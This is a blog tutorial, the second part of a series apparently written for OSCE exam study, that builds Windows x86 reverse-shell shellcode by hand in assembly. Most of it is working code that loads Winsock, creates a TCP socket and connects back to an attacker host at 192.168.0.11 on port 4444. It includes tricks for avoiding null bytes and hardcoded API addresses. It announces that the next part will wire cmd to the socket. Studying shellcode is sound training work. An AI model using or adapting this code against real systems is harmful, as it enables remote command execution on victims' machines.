---
layout: post
title: Windows x86 Manual Shellcode - Part 2
categories: [re,exploit]
tags: [osce]
fullview: false
comments: true
---
In [part 1](https://marcosvalle.github.io/re/exploit/2018/10/20/windows-manual-shellcode-part1.html) we started developing a shellcode from scratch until the point where we loaded `WSAStartup`.

In this part we will continue this development until the successfull connection from the victim machine with the server.

## Call WSAStartup
Last thing we did was finding the address of WSAStartup. In order to use it lets check the [required syntax](https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup):

~~~
int WSAStartup(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
);
~~~

And also:

> **wVersionRequired**

> The highest version of Windows Sockets specification that the caller can use. The high-order byte specifies the minor version number; the low-order byte specifies the major version number.

> **lpWSAData**

> A pointer to the WSADATA data structure that is to receive details of the Windows Sockets implementation.

Now we must find out the size of the [WSADATA](https://docs.microsoft.com/en-us/windows/desktop/api/winsock/ns-winsock-wsadata) structure so we can allocate some space for it.

~~~
typedef struct WSAData {
  WORD           wVersion;
  WORD           wHighVersion;
  unsigned short iMaxSockets;
  unsigned short iMaxUdpDg;
  char           *lpVendorInfo;
  char           szDescription[WSADESCRIPTION_LEN + 1];
  char           szSystemStatus[WSASYS_STATUS_LEN + 1];
} WSADATA;
~~~

Although it seems at first we should simply sum each attribute size to get the total size occupied by this structure, that is generally not a good way to go. You can check [here](https://stackoverflow.com/questions/119123/why-isnt-sizeof-for-a-struct-equal-to-the-sum-of-sizeof-of-each-member) why the size of a `struct` is not necessarily the same as the sum of its attibutes' sizes.

I wrote a quick and dirty C script to find it out:

~~~
#include<stdio.h>
#include<winsock2.h>
 
int main(int argc , char *argv[])
{
    WSADATA wsa;
    printf("%x", sizeof(wsa));
 
    return 0;
}
~~~

And compile it with:

    i686-w64-mingw32-gcc winsock.c -o shared/winsock.exe -lws2_32

![1-WSAData size]({{ "/assets/media/manualshellcode/shellcode_wsadatasize.png" | absolute_url }})

With that in mind we can now set 2.2 as the `wVersionRequired` (check [MS docs](https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup) for more) and write the following code:

~~~
.callWSAStartup:
	xor ebx, ebx			;clear ebx
	mov bx, 0x0190			;set the lower bytes of ebx to the size of WSAData struct
	sub esp, ebx			;open space for receiving the WSAData struct
	push esp			;save a pointer to the WSAData struct
	xor ecx, ecx			;clear ecx
	mov cx, 0x0202			;set the lower bytes of ecx to the version of winsock (2.2)
	push cx				;push wVersionRequired (2.2)

	call eax			;call WSAStartup(MAKEWORD(2, 2), wsadata_pointer)
~~~

Lets put everything together and see how it goes inside a debugger:

![2-dbg4]({{ "/assets/media/manualshellcode/shellcode_dbg4.png" | absolute_url }})

According to [MS docs](https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup):

> If successful, the WSAStartup function returns zero. Otherwise, it returns one of the error codes listed below.

Cool, it seems like we are all set to call `WSAStartup`. For now, lets check how does [Metasploit's reverse_tcp](https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm) does it:

~~~
  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
~~~

Interesting, they reduce a few bytes by using the version as the same value of the size of WSAData. Lets assemble/link this code and debug it:

~~~
global _start

section .text

_start:

.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax				;includes \0 at the end without insert NULLs
	push 0x5f327377 		;_2sw
	push esp			    ;pointer to the string

	mov ebx, 0x7c801d7b		;addr of LoadLibraryA (0x7c801d7b)
	call ebx

	mov ebp, eax			;save winsock handle

.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075          ;'pu'
	push eax
	push 0x74726174         ;'trat'
	push 0x53415357         ;'SASW'
	push esp	            ;pointer to the string

	push ebp	            ;winsock handler
	
	mov ebx, 0x7c80ae40     ;addr of GetProcAddress
	call ebx

.callWSAStartUp:
	mov ebx, 0x0190        ; EAX = sizeof( struct WSAData )
	sub esp, ebx           ; alloc some space for the WSAData structure
	push esp               ; push a pointer to this stuct
	push ebx               ; push the wVersionRequested parameter
	
	call eax
~~~

Notice we changed `eax` to `ebx` since we have saved `WSAStartup`'s address in the first register.

![2-dbg4]({{ "/assets/media/manualshellcode/shellcode_dbg5.png" | absolute_url }})

It seems to be working fine too, even though they used a `wVersionRequired` other than `2.2`. If we read the *Remarks* section from the documentation more carefully we figure out the reason why:

> If the version requested by the application is equal to or higher than the lowest version supported by the Winsock DLL, the call succeeds and the Winsock DLL returns detailed information in the WSADATA structure pointed to by the lpWSAData parameter.

And also:

> It is legal and possible for an application or DLL written to use a lower version of the Windows Sockets specification that is supported by the Winsock DLL to successfully negotiate this lower version using the WSAStartup function. For example, an application can request version 1.1 in the wVersionRequested parameter passed to the WSAStartup function on a platform with the Winsock 2.2 DLL. In this case, the application should only rely on features that fit within the version requested.

## Get WSASocketA with GetProcAddress
This step is simmilar to `Get WSAStartup with GetProcAddress`. The only difference is the string used.

~~~
.getWSASocketA:
	xor eax, eax

	mov ax, 0x4174      ; 'At'
	push eax
	push 0x656b636f     ; 'ekco'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx
~~~

## Call WSASocketA
From the [docs](https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-wsasocketa):

> The WSASocket function creates a socket that is bound to a specific transport-service provider.

And for the syntax:

~~~
SOCKET WSAAPI WSASocketA(
  int                 af,		//2 (IPv4)
  int                 type,		//1 (SOCK_STREAM)
  int                 protocol,		//6 (IPPROTO_TCP)
  LPWSAPROTOCOL_INFOA lpProtocolInfo,	//NULL
  GROUP               g,		//0 (no group operation)
  DWORD               dwFlags		//NULL
);
~~~

Lets set up the stack:

~~~
.callWSASocketA:
	xor ebx, ebx		;clear ebx
	push ebx;		;dwFlags=NULL
	push ebx;		;g=NULL
	push ebx;		;lpProtocolInfo=NULL
	
	xor ecx, ecx		;clear ecx
	mov cl, 0x6		;protocol=6
	push ecx

	inc ebx			;ebx==1
	push ebx		;type=1
	inc ebx			;af=2
	push ebx

	call eax		;call WSASocketA

	push eax		;save eax in edx
	pop edi			;...
~~~

Notice we used `push ebx` to push NULL bytes without actually writing any NULLs in our shellcode. We also used a little trick to reduce a few bytes. Instead of setting `0x6` in `bl`, we used `ecx`. Why? Because we knew in advance we would need to push `0x1`and `0x2` right after, so we decided to keep `ebx`as 0 and increment it later. This way we 'skipped' `0x6` and used `ebx` to save some bytes.

We also save the file descriptor of the newly created socket in `edi`, so we keep `eax` free to receive the next return value.

## Get connect with GetProcAddress
Pretty much the same as we have been doing so far to get functions addresses. 

~~~
.getConnect:
	xor eax, eax

	mov eax, 0x74636590     ;'\x90tce'
	shr eax, 8
	push eax
	push 0x6e6e6f63     ;'nnoc'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx
~~~

Notice the small trick here to push 3 bytes followed by a NULL terminator. A somewhat common idea is to do:

~~~
.getConnect:
	xor eax, eax

	push byte 0x74	    ;'t'
	mov ax, 0x6365      ;'ce'
	push ax
	push 0x6e6e6f63     ;'nnoc'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx
~~~

However, this would cause problems related to the stack alignment.

## Call connect
From the [docs](https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-connect):

> The connect function establishes a connection to a specified socket.

And the syntax:

~~~
int WSAAPI connect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen
);
~~~

At this time we should have a socket handler stored in `edi` and the address of `connect` stored in `eax`. Next step is to set up the [sockaddr struct](https://docs.microsoft.com/en-us/windows/desktop/WinSock/sockaddr-2):

~~~
struct sockaddr {
        ushort  sa_family;
        char    sa_data[14];
};

struct sockaddr_in {
        short   sin_family;
        u_short sin_port;
        struct  in_addr sin_addr;
        char    sin_zero[8];
};
~~~

`sockaddr` is somewhat like a polymorphism where the actual type of structure to be used migh vary. In our case we want to use `sockaddr_in`, which is the specific structure for TCP connections. In short, we must push the IP in hex format, then the port and finally the family.

~~~
; Call connect
	;set up sockaddr_in
	mov ebx, 0x1c11b9d1	;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
	sub ebx, 0x11111111	;subtract from ebx to obtain the real IP
	push ebx		;push sin_addr
	push word 0x5c11	;0x115c = (port 4444)

	xor ebx, ebx
	mov bl, 2
	push bx	
	mov edx, esp

	push byte 0x10
	push edx
	push edi

	call eax
~~~

This time we had to use another trick to encode the IP, which contains NULLs. The solution was to add the value `0x11111111` to it and then subtract to get the correct IP.

Here it is the complete code so far:

~~~
global _start

section .text

_start:

.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax				;includes \0 at the end without insert NULLs
	push 0x5f327377 		;_2sw
	push esp			    ;pointer to the string

	mov ebx, 0x7c801d7b		;addr of LoadLibraryA (0x7c801d7b)
	call ebx

	mov ebp, eax			;save winsock handle

.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075          ;'up'
	push eax
	push 0x74726174         ;'trat'
	push 0x53415357         ;'SASW'
	push esp	            ;pointer to the string

	push ebp	            ;winsock handler
	
	mov ebx, 0x7c80ae40     ;addr of GetProcAddress
	call ebx

.callWSAStartUp:
	xor ebx, ebx
	mov bx, 0x0190
	sub esp, ebx
	push esp
	xor ecx, ecx
	mov cx, 0x0202
	push ecx

	call eax		        ;WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)


.getWSASocketA:
	xor eax, eax

	mov ax, 0x4174          ;'At'
	push eax
	push 0x656b636f         ;'ekco'
	push 0x53415357         ;'SASW'
	push esp	            ;pointer to the string

	push ebp	            ;socket handler
	
	mov ebx, 0x7c80ae40     ;addr of GetProcAddress
	call ebx

.callWSASocketA:
	xor ebx, ebx		    ;clear ebx
	push ebx;		        ;dwFlags=NULL
	push ebx;		        ;g=NULL
	push ebx;		        ;lpProtocolInfo=NULL
	
	xor ecx, ecx		    ;clear ecx
	mov cl, 0x6		        ;protocol=6
	push ecx

	inc ebx			        ;ebx==1
	push ebx		        ;type=1
	inc ebx			        ;af=2
	push ebx

	call eax		        ;call WSASocketA

	push eax		        ;save eax in edx
	pop edi			

.getConnect:
	xor eax, eax

	mov eax, 0x74636590     ;'\x90tce'
	shr eax, 8
	push eax
	push 0x6e6e6f63         ;'nnoc'
	push esp	            ;pointer to the string

	push ebp	            ;socket handler
	
	mov ebx, 0x7c80ae40     ;addr of GetProcAddress
	call ebx

; Call connect
	;set up sockaddr_in
	mov ebx, 0x1c11b9d1	    ;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
	sub ebx, 0x11111111	    ;subtract from ebx to obtain the real IP
	push ebx		        ;push sin_addr
	push word 0x5c11	    ;0x115c = (port 4444)

	xor ebx, ebx
	mov bl, 2
	push bx	
	mov edx, esp

	push byte 0x10
	push edx
	push edi

	call eax
~~~

After running it we get:

![3-dbg5]({{ "/assets/media/manualshellcode/shellcode_connect.png" | absolute_url }})

In the next part we will finally redirect `cmd` to our socket and get our complete shellcode.

